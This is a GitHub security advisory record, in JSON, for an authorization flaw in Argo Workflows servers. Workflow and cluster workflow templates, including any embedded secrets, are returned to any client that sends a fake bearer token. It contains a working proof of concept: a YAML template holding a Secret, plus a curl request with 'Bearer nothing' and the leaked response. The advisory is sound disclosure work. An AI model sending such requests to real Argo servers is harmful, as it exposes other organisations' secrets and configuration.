{"credits": [{"type": "reporter", "user": {"avatar_url": "https://avatars.githubusercontent.com/u/125840508?v=4", "events_url": "https://api.github.com/users/Masamuneee/events{/privacy}", "followers_url": "https://api.github.com/users/Masamuneee/followers", "following_url": "https://api.github.com/users/Masamuneee/following{/other_user}", "gists_url": "https://api.github.com/users/Masamuneee/gists{/gist_id}", "gravatar_id": "", "html_url": "https://github.com/Masamuneee", "id": 125840508, "login": "Masamuneee", "node_id": "U_kgDOB4AsfA", "organizations_url": "https://api.github.com/users/Masamuneee/orgs", "received_events_url": "https://api.github.com/users/Masamuneee/received_events", "repos_url": "https://api.github.com/users/Masamuneee/repos", "site_admin": false, "starred_url": "https://api.github.com/users/Masamuneee/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/Masamuneee/subscriptions", "type": "User", "url": "https://api.github.com/users/Masamuneee", "user_view_type": "public"}}], "cve_id": "CVE-2026-28229", "cvss": {"score": 7.5, "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"}, "cvss_severities": {"cvss_v3": {"score": 7.5, "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"}, "cvss_v4": {"score": 0.0, "vector_string": null}}, "cwes": [{"cwe_id": "CWE-200", "name": "Exposure of Sensitive Information to an Unauthorized Actor"}, {"cwe_id": "CWE-863", "name": "Incorrect Authorization"}], "description": "### Summary
Workflow templates endpoints allow any client to retrieve WorkflowTemplates (and ClusterWorkflowTemplates). Any request with a `Authorization: Bearer nothing` token can leak sensitive template content, including embedded Secret manifests.

### Details

https://github.com/argoproj/argo-workflows/blob/b519c9054e66b2f0a25eec06709717bd1362f72e/server/workflowtemplate/workflow_template_server.go#L60-L78

https://github.com/argoproj/argo-workflows/blob/b519c9054e66b2f0a25eec06709717bd1362f72e/server/clusterworkflowtemplate/cluster_workflow_template_server.go#L54-L72

Informers use the server’s rest config, so they read using server SA privileges. 

https://github.com/argoproj/argo-workflows/blob/b519c9054e66b2f0a25eec06709717bd1362f72e/server/workflowtemplate/informer.go#L29-L42

https://github.com/argoproj/argo-workflows/blob/b519c9054e66b2f0a25eec06709717bd1362f72e/server/clusterworkflowtemplate/informer.go#L34-L46

### PoC
1. Create template

```yml
apiVersion: argoproj.io/v1alpha1
kind: WorkflowTemplate
metadata:
  name: leak-workflow-template
  namespace: argo
spec:
  templates:
  - name: make-secret
    resource:
      action: create
      manifest: |
        apiVersion: v1
        kind: Secret
        metadata:
          name: leaked-secret
        type: Opaque
        data:
          password: c3VwZXJzZWNyZXQ=
```

Then apply that with `kubectl apply -f poc.yml`
2. Query Argo Server with a fake token

**Result:**

```cmd
> kubectl apply -f poc.yml
workflowtemplate.argoproj.io/leak-workflow-template created
> curl -sk -H "Authorization: Bearer nothing" \
    "https://localhost:2746/api/v1/workflow-templates/argo/leak-workflow-template"
{"metadata":{"name":"leak-workflow-template","namespace":"argo","uid":"6f91481c-df9a-4aeb-9fe3-a3fb6b12e11c","resourceVersion":"867394","generation":1,"creationTimestamp":"REDACTED","annotations":{"kubectl.kubernetes.io/last-applied-configuration":"{\"apiVersion\":\"argoproj.io/v1alpha1\",\"kind\":\"WorkflowTemplate\",\"metadata\":{\"annotations\":{},\"name\":\"leak-workflow-template\",\"namespace\":\"argo\"},\"spec\":{\"templates\":[{\"name\":\"make-secret\",\"resource\":{\"action\":\"create\",\"manifest\":\"apiVersion: v1\\nkind: Secret\\nmetadata:\\n  name: leaked-secret\\ntype: Opaque\\ndata:\\n  password: c3VwZXJzZWNyZXQ=\\n\"}}]}}\n"},"managedFields":[{"manager":"kubectl-client-side-apply","operation":"Update","apiVersion":"argoproj.io/v1alpha1","time":"REDACTED","fieldsType":"FieldsV1","fieldsV1":{"f:metadata":{"f:annotations":{".":{},"f:kubectl.kubernetes.io/last-applied-configuration":{}}},"f:spec":{".":{},"f:templates":{}}}}]},"spec":{"templates":[{"name":"make-secret","inputs":{},"outputs":{},"metadata":{},"resource":{"action":"create","manifest":"apiVersion: v1\nkind: Secret\nmetadata:\n  name: leaked-secret\ntype: Opaque\ndata:\n  password: c3VwZXJzZWNyZXQ=\n"}}],"arguments":{}}}
```

### Impact
Any client can leaks Workflow Template and Cluster Workflow Template data, including secrets, artifact locations, service account usage, env vars, and resource manifests.", "epss": {"percentage": 0.00652, "percentile": 0.4656}, "ghsa_id": "GHSA-56px-hm34-xqj5", "github_reviewed_at": "2026-03-11T14:49:37Z", "html_url": "https://github.com/advisories/GHSA-56px-hm34-xqj5", "identifiers": [{"type": "GHSA", "value": "GHSA-56px-hm34-xqj5"}, {"type": "CVE", "value": "CVE-2026-28229"}], "nvd_published_at": "2026-03-11T16:16:40Z", "published_at": "2026-03-11T14:49:37Z", "references": ["https://github.com/argoproj/argo-workflows/security/advisories/GHSA-56px-hm34-xqj5", "https://github.com/argoproj/argo-workflows/commit/34afaf9c0c36f1ba8645d483ea4752cfc4a391e8", "https://github.com/argoproj/argo-workflows/releases/tag/v3.7.11", "https://github.com/argoproj/argo-workflows/releases/tag/v4.0.2", "https://nvd.nist.gov/vuln/detail/CVE-2026-28229", "https://github.com/advisories/GHSA-56px-hm34-xqj5"], "repository_advisory_url": "https://api.github.com/repos/argoproj/argo-workflows/security-advisories/GHSA-56px-hm34-xqj5", "severity": "high", "source_code_location": "https://github.com/argoproj/argo-workflows", "summary": "Unauthorized access to Argo Workflows Template", "type": "reviewed", "updated_at": "2026-05-13T15:23:22Z", "url": "https://api.github.com/advisories/GHSA-56px-hm34-xqj5", "vulnerabilities": [{"first_patched_version": "4.0.2", "package": {"ecosystem": "go", "name": "github.com/argoproj/argo-workflows/v4"}, "vulnerable_functions": [], "vulnerable_version_range": "< 4.0.2"}, {"first_patched_version": "3.7.11", "package": {"ecosystem": "go", "name": "github.com/argoproj/argo-workflows/v3"}, "vulnerable_functions": [], "vulnerable_version_range": ">= 3.7.0, < 3.7.11"}], "withdrawn_at": null}

title: Unauthorized access to Argo Workflows Template
